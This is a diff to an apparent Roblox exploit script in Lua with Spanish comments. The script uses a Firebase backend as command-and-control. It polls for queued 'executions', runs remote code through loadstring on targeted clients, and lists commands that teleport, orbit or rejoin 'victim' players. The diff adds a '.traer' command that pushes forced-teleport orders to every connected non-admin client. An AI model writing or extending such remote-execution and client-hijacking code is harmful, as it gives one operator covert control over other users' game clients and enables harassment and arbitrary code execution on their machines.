@@ -1193,13 +1193,16 @@ task.spawn(function()
                                 local executionKey = tostring(ownerId) .. "/" .. tostring(execId)
                                 if type(execData) == "table" and not lastProcessedExecs[executionKey] then
                                     local target = tostring(execData.target or ""):lower()
+                                    local targetUserId = tostring(execData.targetUserId or "")
                                     local senderServerId = tostring(execData.serverId or "")
                                     local processedBy = type(execData.processed) == "table"
                                         and execData.processed[myUserId] ~= nil
 
                                     local shouldExecute = false
 
-                                    if target == ".all" then
+                                    if targetUserId ~= "" and targetUserId == tostring(LocalPlayer.UserId) then
+                                        shouldExecute = true
+                                    elseif target == ".all" then
                                         shouldExecute = true
                                     elseif target == ".s" then
                                         shouldExecute = senderServerId == currentServerId
@@ -1207,7 +1210,7 @@ task.spawn(function()
                                         shouldExecute = true
                                     end
 
-                                    if shouldExecute and not processedBy and execData.code then
+                                    if shouldExecute and not processedBy and (execData.code or execData.action == "teleport_to_server") then
                                         local sName = tostring(execData.sender_name or "")
                                         local sHwid = tostring(execData.sender_hwid or "")
                                         local verified = VerifySender(tostring(ownerId), sName, sHwid)
@@ -1222,8 +1225,16 @@ task.spawn(function()
                                             )
 
                                             pcall(function()
-                                                local func = loadstring(execData.code)
-                                                if func then func() end
+                                                if execData.action == "teleport_to_server" then
+                                                    local placeId = tonumber(execData.placeId)
+                                                    local jobId = tostring(execData.jobId or "")
+                                                    if placeId and jobId ~= "" then
+                                                        TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
+                                                    end
+                                                elseif execData.code then
+                                                    local func = loadstring(execData.code)
+                                                    if func then func() end
+                                                end
                                             end)
                                         end
                                     end
@@ -1888,6 +1899,7 @@ task.spawn(function()
         end)
 
         local commands = {
+            {".traer [nombre/all]", "Traer al servidor actual a un cliente conectado en Firebase", false},
             {".t [Victima] [Objetivo]", "Teleport de la Victima a el Objetivo", true},
             {".rj [Victima/all]", "Rejoin: .rj=yo | .rj nombre=específico | .rj all=todos", false},
             {".u [Victima] [Objetivo]", "Haz orbitar la victima en el objetivo", true},
@@ -1979,7 +1991,55 @@ task.spawn(function()
             if cmd == "" then return end
             local cmdPrefix = cmd:match("^(%S+)"):lower()
             local victimaArg = cmd:match("%S+%s+(%S+)") and cmd:match("%S+%s+(%S+)"):lower() or nil
-            
+
+            if cmdPrefix == ".traer" then
+                if not isOwner then return end
+                local objetivo = victimaArg
+                if not objetivo then return end
+
+                local heartbeats = firebaseRequest("GET", "/heartbeats")
+                if not heartbeats or type(heartbeats) ~= "table" then return end
+
+                local ahora = os.time()
+                local enviados = 0
+                local myHwid = ""
+                pcall(function()
+                    if gethwid then myHwid = tostring(gethwid())
+                    elseif getdeviceid then myHwid = tostring(getdeviceid()) end
+                end)
+
+                for uid, data in pairs(heartbeats) do
+                    if type(data) == "table" then
+                        local nombre = tostring(data.username or "")
+                        local rol = tostring(data.role or ""):lower()
+                        local timestamp = tonumber(data.timestamp) or 0
+                        local conectado = (ahora - timestamp) < 60
+                        local esObjetivo = objetivo == "all" or nombre:lower():sub(1, #objetivo) == objetivo
+
+                        if conectado and esObjetivo and rol ~= "owner" and rol ~= "admin" then
+                            local execId = HttpService:GenerateGUID(false)
+                            firebaseRequest("PUT", "/executions/owners/" .. myUserId .. "/" .. execId, {
+                                targetUserId = tostring(uid),
+                                action = "teleport_to_server",
+                                placeId = game.PlaceId,
+                                jobId = game.JobId,
+                                sender_name = LocalPlayer.Name,
+                                sender_hwid = myHwid,
+                                timestamp = os.time()
+                            })
+                            enviados = enviados + 1
+                        end
+                    end
+                end
+
+                commandInput.Text = ""
+                local originalText = sendBtn.Text
+                sendBtn.Text = "✓ Enviado: " .. enviados
+                task.wait(1)
+                sendBtn.Text = originalText
+                return
+            end
+
             if cmdPrefix == ".rj" and isOwner then
                 local meAfecta = (victimaArg == nil)
                 if not meAfecta and victimaArg then
